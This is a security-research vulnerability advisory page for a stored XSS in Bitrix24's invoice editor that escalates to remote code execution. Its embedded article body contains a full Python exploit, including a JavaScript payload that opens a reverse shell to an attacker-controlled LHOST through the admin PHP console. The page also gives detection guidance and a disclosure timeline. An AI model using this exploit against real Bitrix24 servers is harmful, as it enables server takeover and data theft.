<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>(CVE-2023-1715 &amp; CVE-2023-1716) Bitrix24 Stored Cross-Site Scripting (XSS) via Improper Input Neutralization on Invoice Edit Page | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity Critical   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1715 &amp; CVE-2023-1716   CVE Description (CVE-2023-1715): A logic error when using mb_strpos() to check for potential XSS payload in Bitrix24 22.0.300 allows attackers to bypass XSS sanitisation via placing HTML tags at the begining of the payload.">
<meta name="author" content="Lam Jun Rong &amp; Li Jiantao (@CurseRed)">
<link rel="canonical" href="https://starlabs.sg/advisories/23/23-1715/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2&#43;ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="https://starlabs.sg/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://starlabs.sg/logo-white.png">
<link rel="apple-touch-icon" href="https://starlabs.sg/logo-white.png">
<link rel="mask-icon" href="https://starlabs.sg/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-0F9M1FRFWQ"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="(CVE-2023-1715 &amp; CVE-2023-1716) Bitrix24 Stored Cross-Site Scripting (XSS) via Improper Input Neutralization on Invoice Edit Page" />
<meta property="og:description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity Critical   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1715 &amp; CVE-2023-1716   CVE Description (CVE-2023-1715): A logic error when using mb_strpos() to check for potential XSS payload in Bitrix24 22.0.300 allows attackers to bypass XSS sanitisation via placing HTML tags at the begining of the payload." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://starlabs.sg/advisories/23/23-1715/" /><meta property="og:image" content="https://starlabs.sg/logo-white.png"/><meta property="article:section" content="advisories" />
<meta property="article:published_time" content="2023-11-01T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2023-11-01T00:00:00&#43;00:00" /><meta property="og:site_name" content="STAR Labs" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png"/>

<meta name="twitter:title" content="(CVE-2023-1715 &amp; CVE-2023-1716) Bitrix24 Stored Cross-Site Scripting (XSS) via Improper Input Neutralization on Invoice Edit Page"/>
<meta name="twitter:description" content="Summary:    Product Bitrix24     Vendor Bitrix24   Severity Critical   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1715 &amp; CVE-2023-1716   CVE Description (CVE-2023-1715): A logic error when using mb_strpos() to check for potential XSS payload in Bitrix24 22.0.300 allows attackers to bypass XSS sanitisation via placing HTML tags at the begining of the payload."/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Advisories",
      "item": "https://starlabs.sg/advisories/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "(CVE-2023-1715 \u0026 CVE-2023-1716) Bitrix24 Stored Cross-Site Scripting (XSS) via Improper Input Neutralization on Invoice Edit Page",
      "item": "https://starlabs.sg/advisories/23/23-1715/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "(CVE-2023-1715 \u0026 CVE-2023-1716) Bitrix24 Stored Cross-Site Scripting (XSS) via Improper Input Neutralization on Invoice Edit Page",
  "name": "(CVE-2023-1715 \u0026 CVE-2023-1716) Bitrix24 Stored Cross-Site Scripting (XSS) via Improper Input Neutralization on Invoice Edit Page",
  "description": "Summary:    Product Bitrix24     Vendor Bitrix24   Severity Critical   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1715 \u0026amp; CVE-2023-1716   CVE Description (CVE-2023-1715): A logic error when using mb_strpos() to check for potential XSS payload in Bitrix24 22.0.300 allows attackers to bypass XSS sanitisation via placing HTML tags at the begining of the payload.",
  "keywords": [
    
  ],
  "articleBody": "Summary:    Product Bitrix24     Vendor Bitrix24   Severity Critical   Affected Versions Bitrix24 22.0.300 (latest version as of writing)   Tested Versions Bitrix24 22.0.300 (latest version as of writing)   CVE Identifier CVE-2023-1715 \u0026 CVE-2023-1716   CVE Description (CVE-2023-1715): A logic error when using mb_strpos() to check for potential XSS payload in Bitrix24 22.0.300 allows attackers to bypass XSS sanitisation via placing HTML tags at the begining of the payload. (CVE-2023-1716): Cross-site scripting (XSS) vulnerability in Invoice Edit Page in Bitrix24 22.0.300 allows attackers to execute arbitrary JavaScript code in the victim’s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege.   CWE Classification(s) CWE-83 Improper Neutralization of Script in Attributes in a Web Page   CAPEC Classification(s) CAPEC-592 Stored XSS    CVSS3.1 Scoring System: Base Score: 9.0 (Critical) Vector String: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H\n   Metric Value     Attack Vector (AV) Network   Attack Complexity (AC) Low   Privileges Required (PR) Low   User Interaction (UI) Required   Scope (S) Changed   Confidentiality (C) High   Integrity (I) High   Availability (A) High    Vulnerability Details: This report presents information on a Cross Site Scripting (XSS) vulnerability in Bitrix24’s Invoice Edit page that allows an attacker to run arbitrary JavaScript code on the browser of any victim that visits the affected page. If the victim has administrator permissions, an attacker may leverage the built-in “PHP Command Line” feature to execute arbitrary system commands on the target web server.\nAuthorized users may edit an invoice they have access to via the crm.invoice.edit component, located at bitrix/components/bitrix/crm.invoice.edit/component.php and accessible via a post request to https://TARGET_HOST/bitrix/urlrewrite.php?SEF_APPLICATION_CUR_PAGE_URL=/crm/invoice/edit/INVOICE_ID/.\nOne of the fields that can be supplied by an attacker is the USER_DESCRIPTION field. As this field is rendered as HTML by a rich text editor in the frontend, sanitization is performed on this field to prevent XSS:\n// bitrix/components/bitrix/crm.invoice.edit/component.php lines 746 to 763  $userDescription = trim($_POST['USER_DESCRIPTION']); $bSanitizeUserDescription = ($userDescription !== '' \u0026\u0026 mb_strpos($userDescription, ')); // [1] if($bSanitizeComments || $bSanitizeUserDescription) { $sanitizer = new CBXSanitizer(); $sanitizer-ApplyDoubleEncode(false); $sanitizer-SetLevel(CBXSanitizer::SECURE_LEVEL_MIDDLE); //Crutch for for Chrome line break behaviour in HTML editor.  $sanitizer-AddTags(array('div' = array())); $sanitizer-AddTags(array('a' = array('href', 'title', 'name', 'style', 'alt', 'target'))); $sanitizer-AddTags(array('p' = array())); $sanitizer-AddTags(array('span' = array('style'))); if ($bSanitizeComments) $comments = $sanitizer-SanitizeHtml($comments); if ($bSanitizeUserDescription) $userDescription = $sanitizer-SanitizeHtml($userDescription); unset($sanitizer); } The mb_strpos($userDescription, ' check ([1]) is supposed to check if the user description contains the  character, which could indicate that this field contains HTML tags and thus requires sanitization. However, if the  character is the first character, mb_strpos($userDescription, ' would be 0, resulting in $bSanitizeUserDescription being false. Thus, sanitization of this field can be completely bypassed.\nThe $userDescription field is subsequently saved to the database, along with the rest of the invoice data.\nHowever, the built-in Bitrix XSS sanitizer, applied to the body parameters of every request, complicates exploitation of this vulnerability.\nThe XSS sanitizer uses several regular expressions (regex) to identify and sanitize potentially dangerous input. One of these aims to target HTML event handlers, which could lead to XSS. The regex used can be found in bitrix/modules/security/lib/filter/auditor/xss.php on line 173, and a simplified version is shown below:\n/(on[a-z]*)([a-z]{3}[\\s]*=)/is The regex aims to identify patterns such as onerror= and uses two capturing groups to split the dangerous string into two parts. A space is then added between the two parts, neutralizing the event handler. For example, onerror= would be transformed into oner ror=. Note that the regex allows any amount of whitespace between the event handler name (eg onerror) and the equals sign (=). This is compliant with the HTML specification. On its own, this sanitizer is secure.\nWhen an authorized user navigates to the invoice edit page, the stored invoice is retrieved. The user description field is then passed to the CLightHTMLEditor class as the content to be edited.\nThe configuration for this editor, including the content, is injected into the JavaScript context after sanitization by the CUtil::PhpToJSObject function.\nscript // ... // bitrix/modules/fileman/classes/general/light_editor.php line 254 top.$this-jsObjName? = window.$this-jsObjName? = new window.JCLightHTMLEditor(CUtil::PhpToJSObject($this-JSConfig)?); // ... /script The CUtil::PhpToJSObject function calls the CUtil::JSEscape function (shown below) on the value of each key-value pair in the $this-JSConfig array.\n// bitrix/modules/main/tools.php lines 4349 to 4355  public static function JSEscape($s){ static $aSearch = array(\"\\xe2\\x80\\xa9\", \"\\\\\", \"'\", \"\\\"\", \"\\r\\n\", \"\\r\", \"\\n\", \"\\xe2\\x80\\xa8\", \"*/\", \"); static $aReplace = array(\" \", \"\\\\\\\\\", \"\\\\'\", '\\\\\"', \"\\n\", \"\\n\", \"\\\\n\", \"\\\\n\", \"*\\\\/\", \"\\\\/\"); $val = str_replace($aSearch, $aReplace, $s); return $val; } This function performs a simple string replacement on the input string $s to ensure that it does not contain any characters that may break out of a JavaScript string, such as \", ' or \\.\nNotably, this function replaces the byte string \\xe2\\x80\\xa9 (U+2029 Unicode Paragraph Separator) with a regular space (U+0020 Space).\nThis is a significant transformation as the Bitrix XSS sanitizer does not regard the byte string \\xe2\\x80\\xa9 as whitespace. Therefore, the string onerror\\xe2\\x80\\xa9= would not be sanitized. However, CUtil::JSEscape would transform the string into onerror =, which is a valid HTML onerror event handler.\nAfter sanitization and transformation by CUtil::JSEscape, the constructor of the JavaScript class JCLightHTMLEditor injects the content to be edited into HTML:\n// bitrix/js/fileman/light_editor/le_core.js lines 616 to 618  this.pEditorDocument.open(); this.pEditorDocument.write('' + sContent + ''); this.pEditorDocument.close(); Therefore, a malicious attacker may create an invoice with user description . As  is the first character in the string, sanitization in bitrix/components/bitrix/crm.invoice.edit/component.php is bypassed. Additionally, as onerror\\xe2\\x80\\xa9= does not match the regex for an event handler, the built-in XSS sanitizer does not sanitize this string. Finally CUtil::JSEscape replaces \\xe2\\x80\\xa9 with  , resulting in . This string is then injected into HTML, resulting in XSS.\nProof-of-Concept: We have tried our best to make the PoC as portable as possible. This report includes a functional exploit written in Python3 that edits an existing invoice to inject malicious HTML in the user description field.\nA sample exploit script is shown below:\n# Bitrix24 Invoice Edit Page XSS RCE (CVE-2023-XXXXX) # Via: https://TARGET_HOST/crm/invoice/edit/XXXX # Author: Lam Jun Rong (STAR Labs SG Pte. Ltd.) #!/usr/bin/env python3 import base64 import requests import re import os import typing import subprocess import threading HOST = \"http://localhost:8000\" SITE_ID = \"s1\" USERNAME = \"user\" PASSWORD = \"abcdef\" TARGET_INVOICE_ID = 3 LPORT = 9001 LHOST = \"192.168.86.43\" PROXY = {\"http\": \"http://localhost:8080\"} def nested_to_urlencoded(val: typing.Any, prefix=\"\") - dict: out = dict() if type(val) is dict: for k, v in val.items(): child = nested_to_urlencoded(v, prefix=(k if prefix == \"\" else f\"[{k}]\")) for key, val in child.items(): out[prefix + key] = val elif type(val) in [list, tuple]: for i, item in enumerate(val): child = nested_to_urlencoded(item, prefix=f\"[{i}]\") for key, val in child.items(): out[prefix + key] = val else: out[prefix] = val return out def dict_to_str(d): return \"\u0026\".join(f\"{k}={v}\" for k, v in d.items()) def check_creds(cookie, sessid): return requests.get(HOST + \"/bitrix/tools/public_session.php\", headers={ \"X-Bitrix-Csrf-Token\": sessid }, cookies={ \"PHPSESSID\": cookie, }, proxies=PROXY).text == \"OK\" def login(session, username, password): if os.path.isfile(\"./cached-creds.txt\"): cookie, sessid = open(\"./cached-creds.txt\").read().split(\":\") if check_creds(cookie, sessid): session.cookies.set(\"PHPSESSID\", cookie) print(\"[+] Using cached credentials\") return sessid else: print(\"[!] Cached credentials are invalid\") session.get(HOST + \"/\") resp = session.post( HOST + \"/?login=yes\", data={ \"AUTH_FORM\": \"Y\", \"TYPE\": \"AUTH\", \"backurl\": \"/\", \"USER_LOGIN\": username, \"USER_PASSWORD\": password, }, ) if session.cookies.get(\"BITRIX_SM_LOGIN\", \"\") == \"\": print(f\"[!] Invalid credentials\") exit() sessid = re.search(re.compile(\"'bitrix_sessid':'([a-f0-9]{32})'\"), resp.text).group( 1 ) print(f\"[+] Logged in as {username}\") with open(\"./cached-creds.txt\", \"w\") as f: f.write(f\"{session.cookies.get('PHPSESSID')}:{sessid}\") return sessid def edit_invoice(session: requests.Session, sessid): payload = base64.b64encode(\"\"\" fetch(\"/bitrix/admin/php_command_line.php?lang=en\u0026\"+window.parent.document.body.innerHTML.match(/sessid=[a-f0-9]{32}/)[0],{ method:\"POST\", headers:{ 'Content-Type': 'application/x-www-form-urlencoded' }, body: new URLSearchParams({ query: `$sock=fsockopen(\"LHOST\",LPORT);$proc=proc_open(\"/bin/sh -i\", array(0=$sock, 1=$sock, 2=$sock),$pipes);`, ajax: \"y\", result_as_text:\"N\" }) }) \"\"\".replace(\"LHOST\", LHOST).replace(\"LPORT\", str(LPORT)).encode()) session.post( HOST + f\"/bitrix/urlrewrite.php?SEF_APPLICATION_CUR_PAGE_URL=%2Fcrm%2Finvoice%2Fedit%2F{TARGET_INVOICE_ID}%2F\", headers={ \"Content-Type\": \"application/x-www-form-urlencoded\", }, data={ \"sessid\": sessid, \"CRM_INVOICE_EDIT_V12_active_tab\": \"tab_1\", \"ACCOUNT_NUMBER\": TARGET_INVOICE_ID, \"ORDER_TOPIC\": \"sss\", \"STATUS_ID\": \"N\", \"PAY_VOUCHER_DATE\": \"\", \"PAY_VOUCHER_NUM\": \"\", \"REASON_MARKED_SUCCESS\": \"\", \"DATE_MARKED\": \"\", \"REASON_MARKED\": \"\", \"PRIMARY_ENTITY_TYPE\": \"COMPANY\", \"PRIMARY_ENTITY_ID\": \"1\", \"SECONDARY_ENTITY_IDS\": \"7\", \"REQUISITE_ID\": \"0\", \"BANK_DETAIL_ID\": \"0\", \"PAY_SYSTEM_ID\": \"1\", \"UF_MYCOMPANY_ID\": \"0\", \"MC_REQUISITE_ID\": \"0\", \"MC_BANK_DETAIL_ID\": \"0\", \"RECUR_PARAM[PERIOD]\": \"1\", \"RECUR_PARAM[DAILY_INTERVAL_DAY]\": \"1\", \"RECUR_PARAM[DAILY_WORKDAY_ONLY]\": \"N\", \"RECUR_PARAM[WEEKLY_INTERVAL_WEEK]\": \"1\", \"RECUR_PARAM[WEEKLY_WEEK_DAYS][]\": \"1\", \"RECUR_PARAM[MONTHLY_TYPE]\": \"1\", \"RECUR_PARAM[MONTHLY_INTERVAL_DAY]\": \"1\", \"RECUR_PARAM[MONTHLY_WORKDAY_ONLY]\": \"N\", \"RECUR_PARAM[MONTHLY_MONTH_NUM_1]\": \"1\", \"RECUR_PARAM[MONTHLY_WEEKDAY_NUM]\": \"0\", \"RECUR_PARAM[MONTHLY_WEEK_DAY]\": \"1\", \"RECUR_PARAM[MONTHLY_MONTH_NUM_2]\": \"1\", \"RECUR_PARAM[YEARLY_TYPE]\": \"1\", \"RECUR_PARAM[YEARLY_INTERVAL_DAY]\": \"1\", \"RECUR_PARAM[YEARLY_WORKDAY_ONLY]\": \"N\", \"RECUR_PARAM[YEARLY_MONTH_NUM_1]\": \"1\", \"RECUR_PARAM[YEARLY_WEEK_DAY_NUM]\": \"0\", \"RECUR_PARAM[YEARLY_WEEK_DAY]\": \"1\", \"RECUR_PARAM[YEARLY_MONTH_NUM_2]\": \"1\", \"RECUR_PARAM[START_DATE]\": \"\", \"RECUR_PARAM[REPEAT_TILL]\": \"\", \"RECUR_PARAM[END_DATE]\": \"\", \"RECUR_PARAM[LIMIT_REPEAT]\": \"0\", \"RECUR_PARAM[DATE_PAY_BEFORE_TYPE]\": \"0\", \"RECUR_PARAM[DATE_PAY_BEFORE_COUNT]\": \"0\", \"RECUR_PARAM[DATE_PAY_BEFORE_PERIOD]\": \"1\", \"RECUR_PARAM[RECURRING_EMAIL_ID]\": \"22\", \"COMMENTS\": \"\", \"USER_DESCRIPTION\": b\"\\xe2\\x80\\xa9=eval(atob('\"+payload+b\"'))\", \"INVOICE_PRODUCT_DATA\": \"[{\\\"ID\\\":0,\\\"PRODUCT_NAME\\\":\\\"Bitrix Site Manager\\\",\\\"PRODUCT_ID\\\":23,\\\"QUANTITY\\\":\\\"1.0000\\\",\\\"MEASURE_CODE\\\":796,\\\"MEASURE_NAME\\\":\\\"pcs.\\\",\\\"PRICE\\\":\\\"0.00\\\",\\\"PRICE_EXCLUSIVE\\\":\\\"0.00\\\",\\\"PRICE_NETTO\\\":\\\"0.00\\\",\\\"PRICE_BRUTTO\\\":\\\"0.00\\\",\\\"DISCOUNT_TYPE_ID\\\":1,\\\"DISCOUNT_RATE\\\":\\\"0.00\\\",\\\"DISCOUNT_SUM\\\":\\\"0.00\\\",\\\"TAX_RATE\\\":\\\"0.00\\\",\\\"TAX_INCLUDED\\\":\\\"N\\\",\\\"CUSTOMIZED\\\":\\\"Y\\\",\\\"SORT\\\":10}]\", \"INVOICE_PRODUCT_DATA_SETTINGS\": \"{\\\"ENABLE_DISCOUNT\\\": \\\"N\\\",\\\"ENABLE_TAX\\\": \\\"N\\\"}\", \"saveAndView\": \"Save\", \"invoice_id\": TARGET_INVOICE_ID } ) print(f\"[+] Edited invoice {TARGET_INVOICE_ID}\") if __name__ == \"__main__\": s = requests.Session() s.proxies = PROXY sessid = login(s, USERNAME, PASSWORD) edit_invoice(s, sessid) print(f\"[+] Visit this URL as admin to execute attack: {HOST}/crm/invoice/edit/{TARGET_INVOICE_ID}/\") print(\"[+] Waiting for reverse shell connection\") subprocess.run([\"nc\", \"-nvlp\", str(LPORT)]) Exploit Conditions: This vulnerability can be exploited when the attacker has access to the CRM feature and permission to create and export contacts. This level of access may be granted if the user is in the management board group.\nDetection Guidance: It is possible to detect the exploitation of this vulnerability by examining traffic logs to detect the presence of the byte string \\xe2\\x80\\xa9 in request bodies. The presence of this string together with other characters like  and = indicate possible exploitation of this vulnerability.\nCredits Lam Jun Rong \u0026 Li Jiantao of of STAR Labs SG Pte. Ltd. (@starlabs_sg)\nTimeline  2023-03-17 Initial Vendor Contact via https://www.bitrix24.com/report/ 2023-03-18 No reply from vendor, tried using the form again 2023-03-21 Email to info@bitrix.com 2023-03-21 Email to info@1c-bitrix.ru 2023-03-24 Got reply from info@1c-bitrix.ru, they asked us to email to info@bitrix.com or use the form at https://www.bitrix24.com/report/ with regards to the bug reports 2023-03-29 Emailed to [redacted], [redacted] \u0026 [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform] 2023-03-30 [redacted] replied to us 2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform] 2023-03-31 Emailed back to [redacted] that we are unable to do so because it’s a private program in that [USA bug bounty platform] 2023-03-31 [redacted] emailed back with the invite 2023-03-31 Submitted the reports via that [USA bug bounty platform] 2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements] 2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us 2023-04-04 We submitted the final 2 reports 2023-06-21 [redacted] emailed us “Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.” 2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date. 2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023 2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023 2023-09-22 [redacted] accepted the date 2023-11-01 Public Release  ",
  "wordCount" : "1803",
  "inLanguage": "en",
  "datePublished": "2023-11-01T00:00:00Z",
  "dateModified": "2023-11-01T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Lam Jun Rong \u0026 Li Jiantao (@CurseRed)"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/advisories/23/23-1715/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
</head>

<body class=" dark" id="top">

<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
                <img src="https://starlabs.sg/logo-white.png" alt="logo" aria-label="logo"
                    height="35"> </a>
            <span class="logo-switches">
            </span>
        </div>
        <ul id="menu">
            <li>
                <a href="https://starlabs.sg/" title="Home">
                    <span>Home</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/about/" title="About">
                    <span>About</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/advisories/" title="Advisories">
                    <span>Advisories</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/blog/" title="Blog">
                    <span>Blog</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/achievements/" title="Achievements">
                    <span>Achievements</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/publications/" title="Publications">
                    <span>Publications</span>
                </a>
            </li>
            <li>
                <a href="https://starlabs.sg/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
        </ul>
    </nav>
</header>
<main class="main">

<article class="post-single">
  <header class="post-header">
    <div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/advisories/">Advisories</a></div>
    <h1 class="post-title">
      (CVE-2023-1715 &amp; CVE-2023-1716) Bitrix24 Stored Cross-Site Scripting (XSS) via Improper Input Neutralization on Invoice Edit Page
    </h1>
    <div class="post-meta"><span title='2023-11-01 00:00:00 +0000 UTC'>November 1, 2023</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;Lam Jun Rong &amp; Li Jiantao (@CurseRed)

</div>
  </header> <div class="toc">
    <details >
        <summary accesskey="c" title="(Alt + C)">
            <span class="details">Table of Contents</span>
        </summary>

        <div class="inner"><ul>
                <li>
                    <a href="#summary" aria-label="Summary:">Summary:</a></li>
                <li>
                    <a href="#cvss31-scoring-system" aria-label="CVSS3.1 Scoring System:">CVSS3.1 Scoring System:</a></li>
                <li>
                    <a href="#vulnerability-details" aria-label="Vulnerability Details:">Vulnerability Details:</a></li>
                <li>
                    <a href="#proof-of-concept" aria-label="Proof-of-Concept:">Proof-of-Concept:</a></li>
                <li>
                    <a href="#exploit-conditions" aria-label="Exploit Conditions:">Exploit Conditions:</a></li>
                <li>
                    <a href="#detection-guidance" aria-label="Detection Guidance:">Detection Guidance:</a></li>
                <li>
                    <a href="#credits" aria-label="Credits">Credits</a></li>
                <li>
                    <a href="#timeline" aria-label="Timeline">Timeline</a>
                </li>
            </ul>
        </div>
    </details>
</div>

  <div class="post-content"><h2 id="summary">Summary:<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
<table>
<thead>
<tr>
<th><strong>Product</strong></th>
<th>Bitrix24</th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Vendor</strong></td>
<td>Bitrix24</td>
</tr>
<tr>
<td><strong>Severity</strong></td>
<td>Critical</td>
</tr>
<tr>
<td><strong>Affected Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>Tested Versions</strong></td>
<td>Bitrix24 22.0.300 (latest version as of writing)</td>
</tr>
<tr>
<td><strong>CVE Identifier</strong></td>
<td>CVE-2023-1715 &amp; CVE-2023-1716</td>
</tr>
<tr>
<td><strong>CVE Description</strong></td>
<td><em>(CVE-2023-1715)</em>: A logic error when using mb_strpos() to check for potential XSS payload in Bitrix24 22.0.300 allows attackers to bypass XSS sanitisation via placing HTML tags at the begining of the payload. <em>(CVE-2023-1716)</em>: Cross-site scripting (XSS) vulnerability in Invoice Edit Page in Bitrix24 22.0.300 allows attackers to execute arbitrary JavaScript code in the victim&rsquo;s browser, and possibly execute arbitrary PHP code on the server if the victim has administrator privilege.</td>
</tr>
<tr>
<td><strong>CWE Classification(s)</strong></td>
<td>CWE-83 Improper Neutralization of Script in Attributes in a Web Page</td>
</tr>
<tr>
<td><strong>CAPEC Classification(s)</strong></td>
<td>CAPEC-592 Stored XSS</td>
</tr>
</tbody>
</table>
<h2 id="cvss31-scoring-system">CVSS3.1 Scoring System:<a hidden class="anchor" aria-hidden="true" href="#cvss31-scoring-system">#</a></h2>
<p><strong>Base Score:</strong> 9.0 (Critical)
<strong>Vector String:</strong> <code>CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H</code></p>
<table>
<thead>
<tr>
<th><strong>Metric</strong></th>
<th><strong>Value</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>Attack Vector (AV)</strong></td>
<td>Network</td>
</tr>
<tr>
<td><strong>Attack Complexity (AC)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>Privileges Required (PR)</strong></td>
<td>Low</td>
</tr>
<tr>
<td><strong>User Interaction (UI)</strong></td>
<td>Required</td>
</tr>
<tr>
<td><strong>Scope (S)</strong></td>
<td>Changed</td>
</tr>
<tr>
<td><strong>Confidentiality (C)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Integrity (I)</strong></td>
<td>High</td>
</tr>
<tr>
<td><strong>Availability (A)</strong></td>
<td>High</td>
</tr>
</tbody>
</table>
<h2 id="vulnerability-details">Vulnerability Details:<a hidden class="anchor" aria-hidden="true" href="#vulnerability-details">#</a></h2>
<p>This report presents information on a Cross Site Scripting (XSS) vulnerability in Bitrix24&rsquo;s Invoice Edit page that allows an attacker to run arbitrary JavaScript code on the browser of any victim that visits the affected page. If the victim has administrator permissions, an attacker may leverage the built-in &ldquo;PHP Command Line&rdquo; feature to execute arbitrary system commands on the target web server.</p>
<p>Authorized users may edit an invoice they have access to via the <code>crm.invoice.edit</code> component, located at <code>bitrix/components/bitrix/crm.invoice.edit/component.php</code> and accessible via a post request to <code>https://TARGET_HOST/bitrix/urlrewrite.php?SEF_APPLICATION_CUR_PAGE_URL=/crm/invoice/edit/INVOICE_ID/</code>.</p>
<p>One of the fields that can be supplied by an attacker is the <code>USER_DESCRIPTION</code> field. As this field is rendered as HTML by a rich text editor in the frontend, sanitization is performed on this field to prevent XSS:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="c1">// bitrix/components/bitrix/crm.invoice.edit/component.php lines 746 to 763
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nv">$userDescription</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;USER_DESCRIPTION&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$bSanitizeUserDescription</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$userDescription</span> <span class="o">!==</span> <span class="s1">&#39;&#39;</span> <span class="o">&amp;&amp;</span> <span class="nx">mb_strpos</span><span class="p">(</span><span class="nv">$userDescription</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">));</span> <span class="c1">// [1]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nv">$bSanitizeComments</span> <span class="o">||</span> <span class="nv">$bSanitizeUserDescription</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sanitizer</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">CBXSanitizer</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sanitizer</span><span class="o">-&gt;</span><span class="na">ApplyDoubleEncode</span><span class="p">(</span><span class="k">false</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$sanitizer</span><span class="o">-&gt;</span><span class="na">SetLevel</span><span class="p">(</span><span class="nx">CBXSanitizer</span><span class="o">::</span><span class="na">SECURE_LEVEL_MIDDLE</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="c1">//Crutch for for Chrome line break behaviour in HTML editor.
